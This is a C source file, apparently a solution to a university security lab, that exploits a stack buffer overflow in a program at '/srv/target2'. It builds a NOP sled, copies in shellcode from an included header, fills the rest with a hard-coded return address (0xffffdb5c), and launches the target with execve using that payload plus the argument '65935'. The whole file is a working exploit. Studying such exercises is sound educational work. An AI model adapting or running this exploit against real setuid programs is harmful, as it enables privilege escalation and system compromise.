#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"
const int BUF_SIZE = 409, OFFSET = 201;
const uint32_t RET_ADDR = 0xffffdb5c;

void preparePayload(char *buffer) {
    memset(buffer, 0x90, BUF_SIZE - 1);
    memcpy(buffer + OFFSET, shellcode, sizeof(shellcode) - 1);
    for (int i = OFFSET + sizeof(shellcode) - 1; i < BUF_SIZE - 1; i += 4) {
        *(uint32_t *)(buffer + i) = RET_ADDR;
    }
    buffer[BUF_SIZE - 1] = '\0';
}

int main(void) {
    char *args[4], *env[1], payload[BUF_SIZE];
    preparePayload(payload);
    args[0] = TARGET;
    args[1] = payload;
    args[2] = "65935";
    args[3] = NULL;
    env[0] = NULL;
    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");
    return 0;
}